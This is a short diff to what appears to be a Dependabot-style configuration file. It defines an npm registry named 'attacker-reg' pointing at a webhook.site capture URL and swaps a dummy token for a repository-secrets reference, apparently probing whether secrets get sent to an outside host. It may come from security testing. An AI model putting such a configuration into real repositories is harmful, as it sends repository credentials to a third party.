@@ -3,7 +3,7 @@ registries:
   attacker-reg:
     type: npm-registry
     url: "https://webhook.site/cbd0ed4b-2205-48dc-9d9b-9771154812ae"
-    token: "dummy-token-value"
+    token: "${{secrets.NONEXISTENT_TOKEN}}"
 updates:
   - package-ecosystem: "npm"
     directory: "/"
